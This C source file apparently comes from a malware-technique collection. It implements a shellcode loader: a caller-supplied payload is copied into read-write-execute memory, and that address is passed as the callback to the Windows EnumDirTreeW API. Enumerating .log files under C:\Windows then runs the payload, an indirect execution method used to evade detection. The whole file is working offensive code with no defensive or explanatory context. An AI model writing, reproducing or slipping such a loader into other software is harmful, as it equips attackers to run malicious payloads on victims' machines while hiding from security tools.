#include "Win32Helper.h"

VOID InvokeEnumDirTreeWThreadCallbackRoutine(LPVOID lpParameter)
{
	WCHAR DisposeableBuffer[512] = { 0 };

	if (!SymInitialize(InlineGetCurrentProcess, NULL, TRUE))
		return;

	EnumDirTreeW(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, (PENUMDIRTREE_CALLBACKW)lpParameter, NULL);

	SymCleanup(InlineGetCurrentProcess);
}

BOOL MpfSceViaEnumDirTreeW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumDirTreeWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}